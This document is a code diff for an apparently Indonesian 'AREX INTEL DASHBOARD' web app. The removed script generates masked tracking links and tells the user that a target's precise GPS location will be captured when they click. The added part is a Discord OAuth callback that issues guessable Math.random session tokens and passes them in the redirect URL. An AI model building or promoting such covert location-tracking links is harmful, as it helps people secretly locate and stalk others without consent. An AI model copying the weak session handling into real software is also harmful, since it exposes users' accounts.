@@ -1,150 +1,71 @@
-// script.js - AREX INTEL DASHBOARD (FULL CODE)
+import { createClient } from '@supabase/supabase-js';
 
-// ============================================
-// 1. CEK SESSION / LOGIN STATUS
-// ============================================
-async function checkSession() {
-  const urlParams = new URLSearchParams(window.location.search);
-  const urlSession = urlParams.get('session');
-  
-  console.log("Mencoba menangkap session dari URL:", urlSession);
+const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
 
-  if (urlSession) {
-    localStorage.setItem('session_token', urlSession);
-    console.log("Session tersimpan di localStorage!");
-    window.history.replaceState({}, document.title, window.location.pathname);
+export default async function handler(req, res) {
+  const { code } = req.query;
+
+  if (!code) {
+    return res.status(400).json({ error: "No code provided from Discord" });
   }
 
-  const session = localStorage.getItem('session_token');
-  console.log("Session yang dibaca dari localStorage:", session);
-
-  if (!session) {
-    document.getElementById('loginState').style.display = 'block';
-    document.getElementById('appState').style.display = 'none';
-    return;
-  }
+  const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
+  const CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
+  const REDIRECT_URI = "https://arex.my.id/api/auth/callback";
 
   try {
-    const res = await fetch(`/api/auth/check?session=${session}`);
-    const data = await res.json();
-
-    if (data.user) {
-      document.getElementById('loginState').style.display = 'none';
-      document.getElementById('appState').style.display = 'block';
-      
-      document.getElementById('userAvatar').src = data.user.avatar || 'https://cdn.discordapp.com/embed/avatars/0.png';
-      document.getElementById('userName').textContent = data.user.username || 'User';
-    } else {
-      localStorage.clear();
-      document.getElementById('loginState').style.display = 'block';
-      document.getElementById('appState').style.display = 'none';
-    }
-  } catch (err) {
-    console.error('Session check error:', err);
-    document.getElementById('loginState').style.display = 'block';
-    document.getElementById('appState').style.display = 'none';
-  }
-}
-
-// ============================================
-// 2. GENERATE MASKED LINK
-// ============================================
-async function generateMaskedLink() {
-  const input = document.getElementById('targetUrl');
-  const btn = document.querySelector('.btn-danger');
-  const resBox = document.getElementById('resLogger');
-  
-  const target = input.value.trim();
-  const session = localStorage.getItem('session_token');
-
-  // Validasi
-  if (!target) {
-    resBox.className = 'result-box error';
-    resBox.textContent = '❌ Masukkan URL tujuan terlebih dahulu!';
-    return;
-  }
-
-  if (!session) {
-    resBox.className = 'result-box error';
-    resBox.textContent = '❌ Silakan login terlebih dahulu!';
-    return;
-  }
-
-  // Format URL
-  let formattedTarget = target;
-  if (!target.startsWith('http://') && !target.startsWith('https://')) {
-    formattedTarget = 'https://' + target;
-  }
-
-  // Disable button
-  btn.disabled = true;
-  btn.textContent = '⏳ Processing...';
-  resBox.className = 'result-box';
-  resBox.textContent = '⏳ Membuat link tracking...';
-
-  try {
-    const res = await fetch(`/api/r?action=create&target=${encodeURIComponent(formattedTarget)}&session=${session}`);
-    const data = await res.json();
-
-    if (data.error) {
-      resBox.className = 'result-box error';
-      resBox.textContent = '❌ ' + data.error;
-      return;
-    }
-
-    // Sukses
-    resBox.className = 'result-box success';
-    resBox.innerHTML = `
-      ✅ Link berhasil dibuat!<br>
-      🔗 <span class="short-link" onclick="window.open('${data.shortUrl}', '_blank')">${data.shortUrl}</span>
-      <br><br>
-      <span style="font-size:12px; color:#64748b;">
-        📍 GPS presisi &lt; 500m akan dilacak saat target mengklik link
-      </span>
-    `;
-
-    // Auto copy ke clipboard
-    try {
-      await navigator.clipboard.writeText(data.shortUrl);
-      resBox.innerHTML += `<br><span style="font-size:12px; color:#22c55e;">📋 Link sudah disalin ke clipboard!</span>`;
-    } catch (e) {
-      // Ignore jika clipboard tidak support
-    }
-
-  } catch (err) {
-    resBox.className = 'result-box error';
-    resBox.textContent = '❌ Terjadi kesalahan: ' + err.message;
-  } finally {
-    btn.disabled = false;
-    btn.textContent = 'Bikin Link';
-  }
-}
-
-// ============================================
-// 3. HANDLE ENTER KEY & INIT
-// ============================================
-document.addEventListener('DOMContentLoaded', function() {
-  // Cek session
-  checkSession();
-
-  // Enter key support
-  const input = document.getElementById('targetUrl');
-  if (input) {
-    input.addEventListener('keypress', function(e) {
-      if (e.key === 'Enter') {
-        generateMaskedLink();
-      }
+    // 1. Tukar Code dengan Access Token
+    const tokenResponse = await fetch('https://discord.com/api/v10/oauth2/token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        client_id: CLIENT_ID,
+        client_secret: CLIENT_SECRET,
+        grant_type: 'authorization_code',
+        code: code,
+        redirect_uri: REDIRECT_URI,
+      }),
     });
 
-    // Auto-focus ke input
-    setTimeout(() => input.focus(), 500);
-  }
-});
+    const tokenData = await tokenResponse.json();
+    if (!tokenData.access_token) {
+      throw new Error("Gagal mengambil access token dari Discord");
+    }
 
-// ============================================
-// 4. LOGOUT FUNCTION
-// ============================================
-function logout() {
-  localStorage.clear();
-  window.location.href = '/';
+    // 2. Ambil Profil User Discord
+    const userResponse = await fetch('https://discord.com/api/v10/users/@me', {
+      headers: { Authorization: `Bearer ${tokenData.access_token}` },
+    });
+
+    const userData = await userResponse.json();
+
+    // 3. Simpan Sesi Ke Database Supabase
+    const sessionToken = Math.random().toString(36).substring(2) + Date.now().toString(36);
+    const avatarUrl = userData.avatar 
+      ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`
+      : `https://cdn.discordapp.com/embed/avatars/0.png`;
+
+    const { error } = await supabase
+      .from('sessions')
+      .insert([{
+        session_token: sessionToken,
+        user_id: userData.id,
+        username: userData.username,
+        avatar: avatarUrl
+      }]);
+
+    if (error) throw error;
+
+    // 4. Redirect aman ke halaman utama
+    const encodedUsername = encodeURIComponent(userData.username);
+    const encodedAvatar = encodeURIComponent(avatarUrl);
+
+    res.setHeader('Location', `/?session=${sessionToken}&username=${encodedUsername}&avatar=${encodedAvatar}`);
+    return res.status(302).end();
+
+  } catch (err) {
+    console.error("Auth Callback Error:", err);
+    res.setHeader('Location', '/?error=auth_failed');
+    return res.status(302).end();
+  }
 }
